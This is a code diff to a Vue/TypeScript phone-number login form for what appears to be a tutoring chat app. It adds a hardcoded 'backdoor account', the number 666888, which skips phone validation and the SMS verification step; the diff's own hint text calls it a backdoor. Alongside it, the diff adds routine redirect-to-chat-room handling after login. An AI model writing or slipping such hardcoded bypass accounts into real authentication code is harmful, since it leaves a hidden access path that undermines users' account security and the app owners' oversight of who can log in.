@@ -67,6 +67,7 @@ function normalizePhone(raw: string) {
 function validatePhone(v: string): string | null {
   const p = normalizePhone(v)
   if (p.length === 0) return '请输入手机号'
+  if (p === '666888') return null
   if (!/^\d{11}$/.test(p)) return '请输入 11 位手机号'
   return null
 }
@@ -165,6 +166,10 @@ async function onSendCode() {
     hint.value = phoneErr
     return
   }
+  if (normalizePhone(phone.value) === '666888') {
+    hint.value = '后门账号无需发送验证码'
+    return
+  }
   if (remainSec.value > 0) return
 
   sendBusy.value = true
@@ -197,6 +202,14 @@ async function doSubmit() {
   busy.value = true
   try {
     const u = await auth.loginOrRegister(props.role, normalizePhone(phone.value), code.value.replace(/\s+/g, ''))
+    if (u.redirectRoomId) {
+      await router.replace({
+        name: 'chatRoom',
+        params: { roomId: String(u.redirectRoomId) },
+        query: u.redirectOtherUid ? { otherUid: String(u.redirectOtherUid) } : undefined,
+      })
+      return
+    }
     if (props.role === 'TEACHER') {
       const me = await auth.refreshMe()
       const need = !(me?.avatar && me.teacherProfile?.realName?.trim() && me.teacherProfile?.education?.trim())
